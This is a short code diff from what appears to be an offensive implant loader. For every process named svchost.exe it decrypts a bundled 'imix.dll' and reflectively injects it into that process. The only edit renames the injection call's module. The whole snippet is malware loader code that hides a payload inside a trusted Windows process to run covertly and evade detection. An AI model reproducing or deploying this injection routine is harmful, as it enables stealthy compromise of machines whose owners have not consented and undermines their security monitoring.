@@ -201,7 +201,7 @@ def main():
         for proc in process.list():
             if "svchost.exe" in proc['name']:
                 enc_bytes = assets.read_bytes("imix.dll")
-                sys.dll_reflect(decrypt(enc_bytes), proc['pid'], 'lib_entry')
+                windows.dll_reflect(decrypt(enc_bytes), proc['pid'], 'lib_entry')
                 return
 
 main()
